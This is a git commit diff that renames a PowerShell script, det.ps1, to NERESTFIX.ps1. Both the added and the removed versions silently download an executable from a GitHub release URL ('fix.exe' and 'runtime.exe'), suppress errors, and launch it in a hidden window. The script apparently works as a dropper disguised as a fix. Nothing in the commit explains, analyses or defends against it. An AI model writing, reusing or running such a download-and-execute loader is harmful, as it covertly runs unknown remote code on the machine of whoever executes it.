191546ea7174ad94d628eebe4de1ddb25500d84a
kilordow <petrovolosuk310@gmail.com>
2026-02-22 15:16:25 +0200

    Update and rename det.ps1 to NERESTFIX.ps1

---
+++ NERESTFIX.ps1
@@ -0,0 +1,5 @@
+Invoke-WebRequest -Uri "https://github.com/kilordow/Fx.exe/releases/download/lol/fix.exe" -OutFile "fix.exe" -ErrorAction SilentlyContinue
+    
+    # Запускаем 
+
+    Start-Process -FilePath "fix.exe" -WindowStyle Hidden
--- det.ps1
+++
@@ -1,4 +0,0 @@
-Invoke-WebRequest -Uri "https://github.com/gg61aaa/ghjg/releases/download/gsdrgsdg/runtime.exe" -OutFile "runtime.exe" -ErrorAction SilentlyContinue
-    
-    # Запускаем 
-    Start-Process -FilePath "runtime.exe" -WindowStyle Hidden
